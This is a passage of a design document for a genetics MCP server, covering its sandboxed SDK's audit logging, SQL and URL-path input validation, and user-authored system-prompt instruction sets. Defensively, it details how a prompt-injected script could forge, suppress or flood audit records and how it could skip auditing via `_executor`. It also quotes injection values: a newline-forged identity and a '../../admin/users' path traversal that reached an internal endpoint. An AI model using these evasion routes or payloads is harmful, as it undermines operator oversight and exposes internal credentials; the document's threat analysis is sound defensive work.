  `gene_annotations` (`n`/`max_distance` off nearest_to, `exclude_olfactory` off group,
  `gencode_version` on group), `ld` (`window` when `other` is given) and `search`
  (`query`/`limit` alongside `rsids`).
- **Sync by default.** Module-level functions are synchronous wrappers that run the coroutine
  on a dedicated background event loop (`sdk/_runner.py`), which keeps the HTTP connection pool
  warm across calls and works from inside an already-running loop. `GeneticsClient` exposes the
  same functions as awaitables.
- **Every call through the SDK surface is audited — `_executor` is not**
  (`genetics-results-suite-4h6.12`). Each `GeneticsClient` coroutine
  method is wrapped at import time (`_instrument` in `sdk/client.py`) so one line per call goes
  to the `genetics_mcp_server.sdk.audit` logger:
  `[user=…] [session=…] [execution=…] Executing SDK function: <name> with input: {…} rows: <n>`,
  plus ` error: <ExceptionType>` when the call raised. It mirrors chat-backend's
  `[user=…] [session=…] Executing tool: <name> with input: {…}` (`llm_service.py`) rather than
  reusing its marker, so a query for `Executing tool:` still matches exactly what it did before
  and script access is a separate, countable thing. The wrapper is instrumented at the client,
  not at `sdk._make_sync`, so the sync and awaitable surfaces produce one line between them and
  not two. `functools.wraps` plus an untouched `__signature__` is load-bearing: `list_capabilities`
  renders the catalogue out of these live objects.
  - **Argument values are summarised, not logged.** An identifier-shaped string
    (`[A-Za-z0-9_.:/@|+-]{1,64}` — gene symbols, variant ids, rsids, phenotype codes, regions,
    view names) is kept verbatim; every other string becomes `<str:len>`, every container
    `<type:len>`, and `bool`/`int`/`float`/`None` stay as they are. SDK arguments are
    *script*-authored and unbounded, unlike the schema-bounded tool inputs, so raw logging would
    let an injected script write chosen text — including forged newline-separated log lines —
    into the operator's log pipeline, and would copy whole `sql()` bodies into it. Exceptions
    contribute their **type** only, because `GeneticsUsageError` messages quote arguments back.
    The charset is anchored with `\Z`, not `$`, which matched before a terminal newline and let
    `'IL7R\n'` through as identifier-shaped.
  - **What the summary cannot tell you.** For the two most powerful shapes the line records
    *that* a read happened, not *what* was read: `sql()` renders as `{'query': <str:N>}` and
    every batch argument (`variants=[…]`, `phenotypes=[…]`, `codes=[…]`) as `<list:N>`. So for
    arbitrary SQL and for batch calls the trail does **not** answer
    genetics-results-suite `docs/code-execution-security.md` §6.2's "what did that script
    read?" — it answers only "how much". Logging the raw query would reintroduce exactly the
    injection the summary exists to prevent, so it is not the fix; what would close it is a
    bounded, allow-list-derived summary — the bare `<view>` names a query
    references, emitted only when the extracted name is on a shipped view allow-list, so no
    attacker-chosen text can reach the line. This repo has no such allow-list today
    (`tools/sql_safety.py` allow-lists *values*, not views; the view list is db-api's), so the
    gap is stated rather than papered over.
  - **A call refused before it reached the executor is not recorded as a read.** Local
    argument validation (`_one_of`, `_reject`, `parse_region` — every `GeneticsUsageError` in
    the module) raises before any upstream call, so it emits
    `Rejected SDK function: <name> with input: {…} error: <ExceptionType>` with **no `rows:`
    field** and does not parse as a data access. The refusal path is the cheap one, so
    recording it in the read shape both inflated the volume below and polluted the answer to
    "what did that script read?" with calls that read nothing.
  - **Only refusals are bounded — 1000 per process (`_AUDIT_MAX_REFUSALS`) — and a call that
    reached the executor is never dropped.** The two are different primitives. A refusal costs
    the script nothing (no socket, no upstream: 1000 were driven through in ~50ms), so it is
    the flooding primitive and is capped, after which one `SDK audit truncated after 1000
    records` notice is emitted and further refusals go unrecorded. A call that reached the
    executor paid an HTTP round-trip to db-api and is charged against the byte and row quotas
    the rest of the sandbox's resource controls rely on, so it cannot be driven at flood
    rates — and capping it is not a flood control but a **suppression primitive**: an earlier
    revision counted both against one ceiling, so 1001 cheap refusals bought silence for every
    genuine `sql()` read that followed. The budget is keyed on a **module-level process
    counter and on nothing the script can write**; keying it on `SANDBOX_EXECUTION_ID` gave a
    script a reset button (a loop rewriting that variable restored the flood at 19,622
    lines/s, higher than before the ceiling existed). Measured after the change, with the
    execution id rotated on every call: 1001 lines / ~206 KB total, then a flat zero. The cost
    is that a supervisor reusing one process across executions shares one refusal budget;
    fixing that belongs on the supervisor's side of the fd (`4h6.45`), not here.
  - **The meta channel is bounded too, and carries no script-chosen text**
    (`_AUDIT_MAX_META_RECORDS`, `_emit_meta`). The truncation notice used to interpolate
    `[execution=…]` — i.e. whatever the script last wrote to `SANDBOX_EXECUTION_ID` — and
    fired once per execution id, so rotating the id produced 3,873 notices in one second.
    Statements about the channel are now capped per process and are literals.
  - **A cancelled call is not filed as a failed read.** `asyncio.CancelledError` ends the line
    with a bare ` cancelled` instead of ` error: CancelledError`, so a shutdown or a timeout
    does not read back as a failure.
  - **Logging can never break the call.** Every emit goes through `_emit`, which swallows
    handler exceptions (a full disk, a supervisor's closed fd) so a successful data access is
    never turned into a failure; the first failure is reported on `sys.__stderr__` — not
    `sys.stderr`, which a sandboxed script may have rebound — and counted in
    `_audit_emit_failures`. The audit logger's level is pinned to `INFO` at import, because a
    logger with no level of its own inherits root's and a host at `WARNING` would have
    discarded this entire control with no error.
  - **`_executor` calls are NOT audited.** `genetics.get_client()._executor.<method>()`
    returns the same data and emits nothing, and `tools/executor.py` ships in the sandbox
    image, so a script can build its own executor in one import (`genetics-results-suite-4h6.33`).
    The underscore is curation, not enforcement. Closing this means instrumenting
    `ToolExecutor` itself, which is a much larger change: every MCP tool call goes through
    those same methods, so it would need chat-backend's existing `Executing tool:` line
    suppressed or deduplicated against the new one. Until then this control reads "audited if
    you use the recommended surface", never "unbypassable".
  - **Identity is `unknown` today**, and the line says so rather than omitting the fields. The
    values are the sandbox token's `sub`/`sid`/`jti` claims, read from `SANDBOX_USER`,
    `SANDBOX_SESSION_ID` and `SANDBOX_EXECUTION_ID`; delivering the token to the child is
    `genetics-results-suite-4h6.43`, and reading and sending it is `-4h6.44`.
  - **The identity fields are sanitised like any other script-authored value**
    (`_audit_identifier`). They come from the environment, which the audited script writes, so
    they get the same `[A-Za-z0-9_.:/@|+-]{1,64}\Z` charset and length cap as an argument, and
    anything failing it is replaced with the literal `<invalid>` — replaced, never truncated,
    because truncating `admin@finngen.fi.attacker.test` to a prefix manufactures a different,
    entirely plausible identity. This is a defect on any architecture, not a sandbox-only one:
    interpolated raw, `SANDBOX_USER = "alice\n[user=admin@finngen.fi"` produced a line that
    **this repo's own parser** (`analyze_conversations.py`) read back as
    `user='admin@finngen.fi'`, and a 100 KB `SANDBOX_USER` put 100,431 bytes on the stream for
    one legitimate call (197 bytes after the fix). Sanitising bounds the damage; it does not
    make the values true — only the supervisor stamping them does.
  - **Without a dedicated fd these records are NOT a tamper-evident audit trail, and they say
    so.** In-process the record lands wherever `Executing tool:` lands; in the sandbox the SDK
    runs in a forked child that configures no logging, so a handler is installed on first use.
    Only the `GENETICS_SDK_AUDIT_FD` path is trustworthy: the supervisor holds the write end,
    and the SDK switches off propagation so inherited handlers cannot copy the records back
    onto a shared stream. Every other shape shares a stream with the audited script — the same
    stderr it writes to with `print(..., file=sys.stderr)` — and per-value escaping is
    irrelevant when the writer owns the stream: a forged line parses cleanly through
    `analyze_conversations.py` and can name any user and session. So when no fd is configured
    the SDK emits `SHARED_STREAM_WARNING` once per process on
    `genetics_mcp_server.sdk.audit.meta` (a child logger: it reaches the same sink but must not
    parse or count as a data access), and the analyzer repeats that warning in any report built
    from such a log. Handler installation is keyed on the **pid**, not a one-shot flag, because
    both the module's state and the parent's handlers survive `fork()` — the earlier one-shot
    guard made the fd path unreachable in exactly the shape it exists for. **Nothing sets that
    fd today, and nothing forwards the child's stream to the pod's stdout for the cluster's
    logging agent: the supervisor does not exist yet (`4h6.39`, with the fd and the forwarding
    in `4h6.45`), so every record emitted today is on the untrusted side of this line.**
  - **These records are a best-effort observability signal, not a security control, and no
    in-process change can make them one.** The audited script shares the address space with
    the code that emits them, so every control in `sdk/client.py` is reachable from the code it
    constrains — each of these was demonstrated: forgery by calling
    `logging.getLogger("genetics_mcp_server.sdk.audit").info(...)` directly, or `os.write` to
    the fd number the SDK necessarily leaves in the environment for the child to find;
    suppression of real records via `logger.disabled`, `setLevel`, `addFilter` or
    `removeHandler`; and reset of any budget keyed on a script-writable variable. The bounds
    and sanitisation above make the channel honest and stop it being actively harmful; they do
    not bound what a hostile script can claim, hide or emit. So the trail describes what a
    well-behaved script did, and nothing — a review, an incident write-up, this document —
    may cite it as evidence under an assumption of compromise. The controls that hold against a
    hostile script are outside the process: the sandbox network policy, db-api's own
    `endpoint_access` lines, and the byte/row quotas.
  - **What `genetics-results-suite-4h6.45` owes, stated as a specification** (also in the
    `sdk/client.py` header, so the ticket inherits a design rather than a puzzle):
    1. **The supervisor reads the fd and enforces on the read end.** The child holds only the
       write end; the rate cap, byte cap and per-line length cap are applied by the supervisor
       as it reads, where no code in the child can raise, reset or bypass them, and overrun is
       the supervisor's decision to record and act on.
    2. **The supervisor stamps identity.** `[user=…] [session=…] [execution=…]` must be written
       by the process holding the sandbox token, from its `sub`/`sid`/`jti` claims. The child
       must not be asked to state who it is.
    3. **The child's framing is untrusted input.** The supervisor parses each line, rejects
       what it cannot parse, and re-emits it in its own framing.
  - `scripts/analyze_conversations.py --sdk-log PATH` parses these lines back into per-session
    SDK stats reported **alongside**, never folded into, the tool counts: a tool call is one
    model decision, an SDK call is one line of a script. The source is a log, not
    `chat_history.db` — the calls happen in another process and are never persisted as message
    content — so with no `--sdk-log` the report states the log is absent instead of printing zero.
    It also reads the log-level notices: a shared-stream warning makes the whole SDK section
    say the counts are an upper bound over forgeable lines, truncation records say how many
    executions lost their tail, and refusals are counted separately from data accesses. The
    per-session `sdk_sequence` is bounded to the first 50 calls with the elided count appended
    (a script can make thousands, and the untrimmed join was a ~150 KB cell in every metrics row
    and CSV); the per-function totals in the report come from the exact `sdk_function_counts`
    column instead, which is bounded by the number of SDK functions.
- **Importable standalone.** Nothing under `sdk/` imports the chat backend, the LLM service,
  the MCP server or the SQLite databases, so the package can be installed into a sandbox image
  on its own. `test_sdk.py` asserts this in a subprocess.
- **The import closure is pinned, because the sandbox image ships exactly it.** That image
  installs this distribution and then deletes every `genetics_mcp_server` file outside the
  closure — a prompt-injected script *reads* source, it does not need it to import. The closure
  is eleven modules: the package `__init__`; `sdk/{__init__,_runner,client,errors}`;
  `tools/{__init__,definitions,executor,phewas_categories,sql_safety,uniprot}`.
  `config/settings.py` was in it until `genetics-results-suite-l41` — it names every internal
  environment variable of the suite — so `uniprot.py` now imports `Settings` under
  `if TYPE_CHECKING` and `ToolExecutor` resolves settings through `_resolve_settings()` at
  first use rather than in `__init__`, falling back to `_PrunedInstallSettings` (a frozen copy
  of the four public-URL/TTL defaults, and an empty `internal_api_secret`, since a sandbox
  holds no secret) when `config.settings` is *itself* not installed — a `ModuleNotFoundError`
  naming anything else in its import chain is re-raised, so a broken install cannot degrade
  into the credential-less fallback, and taking the fallback logs one warning naming no
  variable. `uniprot`, `base_url`, `public_url` and `bigquery_url` are `cached_property` for
  the same reason; `client` is a lock-guarded lazy property rather than a `cached_property`
  because 3.12 dropped that descriptor's lock and the service shares one executor across
  threads, so a race would leak the loser's connection pool past `close()`. Assigning over
  any of them in a test still works.
- **The endpoint reads must stay behind the settings resolution.** `config/settings.py` calls
  `load_dotenv()` at module scope, so the `GENETICS_API_URL` / `GENETICS_PUBLIC_API_URL` /
  `BIGQUERY_API_URL` reads only see a `.env` file once that module has been imported. They go
  through `_endpoint_env()`, which resolves settings first — reading `os.environ` directly at
  construction would put a standalone run (`scripts/analyze_variants.py`, the SDK outside the
  service) on the hard-coded default URL while still attaching a `.env`-supplied secret to it,
  and would silently disable the BigQuery tools. `test_sdk_import_closure.py` pins this.
- `test_sdk_import_closure.py` measures the closure in a fresh interpreter and asserts
  equality, and asserts the SDK imports with `dotenv` unavailable. Every probe forces `src/`
  onto the subprocess `PYTHONPATH` and asserts `genetics_mcp_server.__file__` resolves under
  it, so an editable install pointing at another checkout cannot make it measure the wrong
  tree. Widening the closure means widening `SDK_ALLOWLIST` in
  `genetics-results-suite/sandbox/prune_venv.py` in the same change, or the image build fails.

### SQL safety at the SDK boundary

Five executor methods have no results-api endpoint and build BigQuery SQL themselves
(`get_asm_qtl_by_gene`, `get_open_chromatin_by_gene`, `get_variant_effect_by_gene`,
`get_mpra_by_gene`, `get_mpra_pip_concordance_by_gene`). The db-api's `/query` endpoint accepts
`{sql, max_rows, dry_run}` — **a SQL string with no parameter-binding channel** — so a value
cannot be bound and must be validated before it is spliced in.

`tools/sql_safety.py` is the single place that happens. It is an allow-list, not escaping:
`quote_literal()` accepts a value only if every character is in `[A-Za-z0-9_.@:/+-]` (≤128
chars), which excludes quotes, the backslash escape, the statement separator, whitespace and
parentheses, so an accepted value cannot terminate the literal it sits in. `normalize_literal()`
returns the same validated value **unquoted**, for the callers that also reuse it outside SQL
(the `"gene": gene` echo field, the `filename=f"{gene}_mpra.tsv"` download name that
`chat_api.py` interpolates into a `Content-Disposition` header) — validation runs on the
stripped value, so the raw argument can still carry CR/LF the allow-list never saw.
`sql_int()` and `sql_float()` coerce through `int()`/`float()` with range checks, so a numeric
slot never receives a string at all, and parenthesise a **negative** token so `g.gstart -
{token}` cannot render `gstart--5` (a line comment) if the f-string's space ever disappears;
positive tokens stay bare because BigQuery's `LIMIT` takes a literal, not an expression.
`_gene_window_cte()` renders the shared gene-span CTE from an already-validated literal.

A rejected value returns the executor's normal `{"success": False, "error": ...}` and the query
is never issued. This is defence in depth over the db-api's own `authorize_query`, which
already rejects anything that is not a plain SELECT over the exposed views.

The same five methods gained a `limit` argument (bounded at 100k) so the SDK can raise the
statement's `LIMIT` without a second code path, and the validated token is coerced back with
`int()` before it reaches `query_database(max_rows=...)` — `sql_int` accepts `500.0`, and a
float `max_rows` makes `all_rows[:max_rows]` raise `TypeError` on any result larger than the
limit, surfacing as the generic internal-error message. `limit` defaults to `MAX_ROWS` in the
SDK rather than 500: **it is a display bound, not a work or transfer bound.** `query_database`
calls `_strip_trailing_limit()` and then fetches `max(max_rows, 100_000)`, so the builders'
trailing `LIMIT` never reaches BigQuery — the join and `ORDER BY` run in full regardless, and a
low `limit` buys nothing but a positional prefix of an ordered result.

**Each consumer of these five results gets the shape it can actually use** (`_bq_gene_payload`).
db-api returns rows positionally with the names in a separate `columns` key, and both consumers
used to be handed the bare `rows`:

- `results`, which goes to the **model**, is a list of **dicts** built by zipping `columns` with
  each row. The model was previously shown `[["19", 44908822, 12.3], …]` — values with no names,
  so ASM-QTL, open-chromatin, variant-effect and MPRA by-gene answers were guesswork. This set is
  capped, so building dicts is cheap.
- `_download_data` uses the `{"columns", "rows", "filename"}` form, which `_convert_to_tsv`
  already has a branch for. Passing a list of lists under `results` instead hit that function's
  `results[0].keys()` and raised `AttributeError` inside `_process_download_hints`' `except`, so
  **the download link silently vanished** (that swallowing is fixed — see "Downloadable results"
  below — and the same mistake now raises `DownloadShapeError`). The positional form is also the
  right one here: the download carries up to 100k rows and would be flattened back anyway.

Names always come from `columns` positionally, never from dict iteration order, and a row whose
arity disagrees with `columns` — or that is not a positional sequence at all — makes the tool
return `success: False` rather than label genomic values with the wrong column names. That
validation lives in `_positional_rows`, shared rather than duplicated.

`get_hla_by_allele` is the sixth BigQuery-backed tool and had both defects independently: it
landed in parallel with the fix above, so it shipped bare positional lists to the model and a
dead download link. It now shapes its payload the same way — named dicts in `results`, the
`{columns, rows}` form in `_download_data`, and the same loud failure on a mismatch — through
`_positional_rows`. It keeps its own payload builder rather than calling `_bq_gene_payload`
because it is keyed on `allele`/`resource`/`min_mlogp`/`min_info`/`count`, not on `gene`.

They also take `with_metadata=False`. When set, the returned dict carries the underlying query's
`columns` and `truncated`. Both are still needed after the shape change: an **empty** result has
no row to carry names, and `_frame()` builds `pl.DataFrame({c: [] for c in columns})` so a script
filtering a no-hit gene gets an empty frame instead of `ColumnNotFound`; `truncated` is what
`_check_truncation` raises on. It stays opt-in so the model's payload is not padded with either.

### Empty results keep their schema

A sandboxed script filters whatever frame it gets, so an empty result that has lost its
column names turns an ordinary no-hit query into `ColumnNotFoundError` and costs a retry
iteration (`genetics-results-suite-6uk`). The two backends get there differently:

- **db-api** carries `columns` from the BigQuery job schema, which exists for a zero-row
  result. Covered by `with_metadata=True` above.
- **results-api** returns a bare JSON array, so an empty one is `[]` with no schema at all.
  It now advertises the served file's own header line in an **`X-Columns` response header**
  (one change in that repo's `range_response`, covering all 11 JSON-range routers).
  `ToolExecutor._columns_meta` lifts it into a `column_names` key on the result dict.

`_columns_meta` returns a **dict to splice with `**`** and is gated on
`ToolExecutor(expose_columns=True)`, which only `GeneticsClient` passes: a tool result dict
*is* the MCP tool payload and the chat backend's model input, and this epic freezes both, so
with the flag off — or on an endpoint that does not advertise (search, gene annotations,
gene groups, rsID lookup, LD, gene-disease, gene-based/gene-burden results) — the dict is byte-identical
to before. An **injected** executor keeps whatever it was built with, so an empty
results-api result through the running service's shared executor falls back to a bare frame
rather than silently changing that service's tool output.

`column_names` is deliberately **not** merged into db-api's `columns`. db-api's is required
to read positional rows; this one is advisory, because results-api's rows are already named
dicts. `_frame()` consults `column_names` only when the result is empty — routing a
non-empty results-api result through the positional constructor would give up
`pl.from_dicts`' `strict=False` fallback for the mixed-type columns upstream does produce.

Not covered: results-api endpoints outside the `range_response` family (search, gene
annotations, gene groups, rsID, LD, gene–disease) compute their JSON instead of streaming a
TSV, so they have no header to advertise and degrade to today's bare `pl.DataFrame()`.

### URL path segments

`sql_safety` guards the six SQL slots; the ~59 other caller-controlled values are interpolated
into **results-api URL paths** on `self.client`, which carries the internal bearer token. httpx
normalises `..`, so an unencoded segment is not a cosmetic problem: `mpra(variant=
"../../admin/users")` resolved to `http://api.internal:2000/api/v1/admin/users` with the secret
attached, and `variant="x?a=b#c"` appended an attacker-controlled query string — defeating the
typed surface entirely. `executor._seg()` (`quote(value, safe="")`, plus explicit encoding of
the bare `.`/`..` segments that `quote` leaves alone because `.` is unreserved) now wraps every
such segment, including the ones passed to `_build_download_url()`.

## Response Length

The chat API takes a `verbosity` parameter (`"brief"` — the default — or `"detailed"`), surfaced in the web UI as the **Answer** radio group beside the literature-backend and tool-profile selectors. `chat_api.stream_chat` appends the matching fragment from `_VERBOSITY_PROMPTS` (`config/defaults.py`, via `verbosity_prompt()`) to the end of the system prompt.

| `verbosity` value | Effect on the write-up |
|-------------------|------------------------|
| `"brief"` (default, and the fallback for null/unrecognized values) | Report the three-pass analysis as its conclusions: the answer, the rows that carry it, and interpretation-changing caveats. Retrieved-but-unused data is left to the `INCLUDE_IN_RESPONSE` download links, with a one-line note of what was held back |
| `"detailed"` | The full pass-by-pass write-up — complete data extraction, then literature, then analysis, with the per-source inventory |

**The setting scopes presentation, never method or rigor.** The three-pass approach under "Analyzing data" and every grounding rule apply identically at both settings; only the volume of what gets printed changes. An unrecognized value falls back to `"brief"` rather than raising, since a presentation preference must not fail a chat turn.

Both fragments sit inside the **shared** cached system block (block 0 — see "Instructions" below for the split), so each setting keeps its own prompt-cache entry instead of invalidating the other's. The setting is per-request, and `chat_messages.verbosity` records the value in force per message the same way `literature_backend`, `tool_profile` and `instruction_set_id` do — so reopening a conversation restores the answer detail it was last held under. The column carries the same `ON CONFLICT` full-row-replace semantics as its siblings: a save that omits it clears it.

## Instructions (user-authored system-prompt text)

A user can store several named sets of their own instructions ("I'm a statistician", "answer in
Finnish") and pick one per chat. UI label **Instructions**, code noun `instruction_set`. The
selected set's text is wrapped and appended to the system prompt as a second, separately cached
block. The browser surfaces it in two places (`../genetics-results-browser`): an **Instructions**
entry in the account menu opening `InstructionsDialog.tsx` (list / create / edit / archive /
per-set version history, with clonable example sets), and a compact selector in the chat options
row beside **Answer**.

### Data model (`llm_config.db`)

| Table | Shape |
|---|---|
| `user_instruction_sets` | One row per set — `id` (uuid4), `user_id`, `name`, `body`, `created_at`, `updated_at`, `archived_at`. Index `(user_id, archived_at, updated_at DESC)` |
| `user_instruction_set_history` | Append-only, one row per save — autoincrement `id`, `set_id`, `user_id`, `name`, `body`, `changed_at`, `comment`. Index `(set_id, changed_at DESC)` |

Unlike the tool-description and user-setting tables, which *are* their own history, a set has a
current row plus a separate history table. `archived_at` is a soft delete and **there is no hard
delete**: `chat_messages.instruction_set_id` lives in `chat_history.db`, a different SQLite file
where no foreign key can enforce the reference, so a `DELETE` would silently orphan it.

A one-shot migration in `_migrate_to_history_tables` hands each user their last version of the
retired per-user instructions feature (removed in 99fbdac; `user_instructions_history` is no
longer created for new databases and is deliberately not dropped) as a set named `Imported`,
keeping the original `changed_at` so it does not claim to be the user's newest edit. The guard is
per user — the row is imported only where that user holds *no* sets at all — so one user owning a
set cannot strand everyone else's legacy text, and idempotency survives archiving.

### Caps

| Cap | Value | On write |
|---|---|---|
| `INSTRUCTION_SET_MAX_BODY_CHARS` | 4000 | `InstructionSetBodyTooLong` → **413** |
| `INSTRUCTION_SET_MAX_PER_USER` | 20 | `InstructionSetLimitReached` → **409** |

Both are re-applied on read, because a stored row can predate a cap or survive it being lowered:
`list_instruction_sets` returns at most 20 rows, and `get_instruction_set` returns the full stored
body with `body_over_cap=true` rather than truncating it — the dialog reads that flag to explain
why saving the set back unchanged is rejected (`update` refuses an echoed-back over-cap body)
instead of looking broken. The chat path truncates instead of rejecting; see below.

### Endpoints

All under `/chat/v1`, all `Depends(auth_required)` and scoped to the authenticated caller
(`routers/llm_config.py`):

- `GET /chat/v1/llm-config/user/instruction-sets` — the caller's non-archived sets, most recently edited first
- `POST /chat/v1/llm-config/user/instruction-sets` — `{name, body, comment?}`; 400 on an empty name or body, 413 over the char cap, 409 over the count cap
- `PUT /chat/v1/llm-config/user/instruction-sets/{set_id}` — `{name?, body?, comment?}`, omitted fields keep their value; 400 empty, 413 over cap, **404** for a set that is not the caller's *or* is archived (an archived set is deleted as far as the user is concerned, so editing one must not report success)
- `DELETE /chat/v1/llm-config/user/instruction-sets/{set_id}` — archives, **204**; 404 as above
- `GET /chat/v1/llm-config/user/instruction-sets/{set_id}/history?limit=20` — versions newest first. Archived sets stay readable here, so history survives a delete

Status, detail string and response shape are identical for a foreign id and a nonexistent one on
all three id-taking endpoints, so the API leaks no evidence that another user's set exists;
ownership is checked *before* the length cap, so an over-cap body aimed at a foreign id still
404s rather than 413ing.

**Selection reuses the existing user-settings key** `selected_instruction_set`
(`GET`/`PUT`/`DELETE /chat/v1/llm-config/user/settings/{setting_key}`) — there is no separate
selection endpoint. Archiving a set does not clear that pointer; the client drops to *None* and
clears the setting when the stored id no longer lists, mirroring the server's ignore-unknown-id
rule. The other three chat options persist the same way, under `chat_verbosity`,
`chat_literature_backend` and `chat_tool_profile`; the "all" tool profile round-trips through the
literal `all` because the settings `PUT` rejects an empty `setting_value` with a 400. All four keys
hold the user's *default* — the value an explicit control interaction last wrote — while the
`chat_messages` columns hold what each conversation was actually held under, so reopening an old
conversation restores its options without changing what the next new chat starts from.

### Per-turn metrics (`chat_turn_metrics`)

One row per **completed** assistant turn, written by `_stream_anthropic` in the same block that
logs the `Chat complete:` line, so the log line and the row can never disagree. **The Anthropic
path only** — `_stream_openai` records nothing, so any aggregate over this table under-counts a
deployment that also serves OpenAI. It holds
`iterations`, `tool_call_count`, `input_tokens`, `output_tokens`, `cache_read_tokens`,
`cache_create_tokens`, `cost_usd`, `wall_ms`, `tool_profile`, `model` and `created_at`. Before it,
these numbers existed only in Cloud Logging and had to be recovered from the BigQuery log sink;
`chat_messages.content_json` is not a substitute, because it flattens a whole turn's blocks into
one assistant record, leaving parallel and sequential tool calls indistinguishable and roundtrips
per turn underivable.

- **Keying.** A surrogate `id`, plus `session_id` and `message_id` columns and a *partial* unique
  index on `message_id WHERE message_id IS NOT NULL`. `message_id` is the client-generated
  `chat_messages` primary key and is globally unique on its own, so it needs no `session_id` to
  disambiguate. Both ids are nullable and neither carries a foreign key — `PRAGMA foreign_keys` is
  ON here, so one would abort the insert: the row is written while the stream is still open,
  before the client POSTs the assistant message, and on a conversation's first turn before the
  session row exists at all (the browser creates the session only after the first exchange
  completes). `delete_session` therefore deletes these rows explicitly; the `chat_sessions`
  cascade does not reach them.
- **`user_id` scopes the upsert.** `message_id` arrives from the client and is unique only by
  convention, so without an owner on the row any authenticated user could send another user's
  `message_id` and have their turn overwrite that user's row — cost zeroed, `session_id`
  reassigned, no error and no log. The row therefore carries the authenticated user, and the
  `DO UPDATE` ends in `WHERE chat_turn_metrics.user_id IS excluded.user_id`. A conflicting write
  from a different user **inserts nothing, overwrites nothing, and logs a warning**;
  `record_turn_metrics` returns `None` rather than a row id. `IS` and not `=` so a deployment
  with auth disabled, writing NULL `user_id`, can still re-record its own rows. `user_id` is also
  what makes per-user cost analysis possible at all.
- **Turn-1 rows are orphaned.** The browser does not send `message_id` today and creates the
  session only after the first exchange, so *every* conversation's opening turn is written with
  both ids NULL. Consequences, until the browser change lands (tracked in the browser repo):
  per-session analysis systematically omits every conversation's first turn — usually its most
  cache-expensive — and `WHERE session_id = ?` alone cannot find those rows to delete them.
  `delete_session` therefore also deletes `user_id = ? AND session_id IS NULL AND message_id IS
  NULL`. Those rows are unattributable to any session by construction, so removing them costs no
  analysis that was possible anyway, and leaving them would keep a permanent record that the user
  held a conversation and what it cost. The trade is that deleting one conversation also drops the
  opening turns of that user's *other* conversations; privacy wins it until the ids arrive.
- **`message_id` is bounded at 64 characters** (`Field(None, max_length=64)`; uuid4 is 36). The
  service has no request-body-size middleware, and unlike `session_id` — which is only logged —
  this value is written to the shared RWO volume.
- **Secret chat writes nothing**, checked before the database is reached. Counts and costs are not
  content, but a row keyed to a session id still says a conversation happened and what it cost,
  and secret chat is promised to leave no trace.
- **Abnormal endings.** A turn stopped by `MCP_MAX_ITERATIONS` *is* recorded — that is the
  expensive tail the numbers exist to measure. A turn ended by an exception, a timeout or a client
  disconnect is not: it reaches neither the log line nor the write, and its partial accumulators
  would bias per-turn cost.
- **Failure is swallowed, and the write is off the answer's critical path.** It happens *after*
  the `done` chunk is yielded, not before: `done` carries the `message_content` the client
  persists, and an `await` ahead of it would put a SQLite busy wait (up to the 5s default,
  whenever the nightly analysis job holds the write lock) and a fresh cancellation point between
  the answer and its delivery. `chat_api`'s `event_generator` iterates the stream with a plain
  `async for` and no `break`, so the generator is driven one step past that yield and the write
  still runs. The write is also wrapped and only logged on failure: this runs inside a
  live SSE generator, and telemetry must never truncate an answer. It also runs via
  `asyncio.to_thread`, because `chat_history.db` sits on a ReadWriteOnce volume shared with the
  nightly analyze-conversations CronJob — SQLite blocks for its busy timeout when that job holds
  the write lock, and blocking the event loop would stall every other stream in the process.
- **`message_id` plumbing.** `ChatRequest.message_id` (optional) carries the id the client will
  save the assistant message under, through `stream_chat` into the row. The browser already holds
  that id before it opens the stream but does not send it yet, so today the column is written NULL
  and the row is joined to `chat_messages` by `session_id` + `created_at` ordering.

`limit` on the history endpoint is `Query(20, ge=1, le=100)`. It was unvalidated when first
written: SQLite treats a negative `LIMIT` as unbounded, so `?limit=-1` returned the entire
history, and a value past 64 bits raised `OverflowError` out of the driver as an uncaught 500.
The pre-existing `GET /chat/v1/llm-config/tool-descriptions/{tool_name}/history` had the
identical hole and now carries the same bound.

**The four legacy `/llm-config/tool-descriptions*` endpoints are admin-only** (they were
`auth_required`, including the `PUT`). A tool description is *global* and is what tells the model
when to call a tool, so one user's edit would reach every user's turns — a wider blast radius than
an instruction set, which is per-user and presentation-scoped. Nothing loads these rows into the
chat path today (`llm_service` always receives `custom_tool_descriptions=None`), so the channel
was dormant rather than live, but the gate belongs on the resource rather than on whoever
eventually wires it in. The reads moved with the write: they return `changed_by`, an admin's email
address, and a resource that is admin-to-write but world-to-read invites the write gate being read
as accidental. Note the consequence of `admin_required`: with `ENABLE_ADMIN_PAGE=false` these
routes 404 for everyone. Production sets it `true`
(`k8s/deployments/chat-backend.yaml`), and no client calls them — the browser's `llmConfigApi.ts`
only touches the comments endpoints.

### Resolution on a chat turn

`ChatRequest` gains `instruction_set_id`. **Only the id travels** — the body is loaded server-side
by `_resolve_user_instructions` (`chat_api.py`) scoped to the authenticated user, so prompt text is
never client-supplied and every answer is attributable to a stored set. An id that does not resolve
for this user, an archived set, an unavailable database, a body that is not text — every one of
them degrades to *no instructions* rather than raising. **An unknown id is ignored, never 422**,
the same rule as `verbosity`: a presentation preference must not fail a chat turn.

`ChatRequest` **has no `system_prompt` field**. It used to, with no gate and no length bound, so
any authenticated caller — any user who reaches the chat API through IAP/oauth2-proxy, or an
internal caller holding the shared `INTERNAL_API_SECRET` bearer, which `auth_required` resolves to
the identity `mcp-tool`; per-user API tokens do **not** open this path, they are validated only by
the internal-only `POST /tokens/validate` that the `/mcp` path consumes — could
replace the entire prompt for their turn and discard every grounding, citation, truncation and
out-of-scope rule, bypassing all of the care above with a field two lines away from it. The field
was removed rather than gated; nothing in the suite ever sent it. Pydantic ignores unknown keys, so
a caller still sending one is silently ignored rather than 422'd. The prompt handed to
`llm_service.stream_chat(system_prompt=...)` is always
`default_system_prompt(app_name, tool_names=...)` plus the verbosity fragment — that parameter is
the internal channel `chat_api` assembles, not an override.

**The prompt is assembled from the tool list in force** (`genetics-results-suite-4h6.69`).
`config/defaults.py` holds `_PROMPT_BLOCKS`, a tuple of `_Block`s rather than one string; a block
is emitted only if every tool name appearing in its text is in `tool_names`, with `excludes`,
`requires_any` and `requires_all` as further subtractive gates. `chat_api` gets that list from
`LLMService.resolve_local_tool_names(tool_profile, enable_tools)`, the same profile +
`settings.disabled_tools` + subagent-liveness resolution that builds the tool list itself, so on
the **Anthropic** path the prompt cannot describe a tool the model was not given. It does not
hold for `provider="openai"`: `_stream_openai` takes neither `enable_tools` nor `tool_profile`
and never sets `tools`, so that provider receives the prompt assembled for the full local set
while getting no tools at all — pre-existing, and unchanged by 4h6.69. Consequences on the
Anthropic path: the "Subagent Orchestration" section and the "variant_list_analysis skill"
reference disappear with `ENABLE_SUBAGENTS=false`, "Phenotype Reports" with
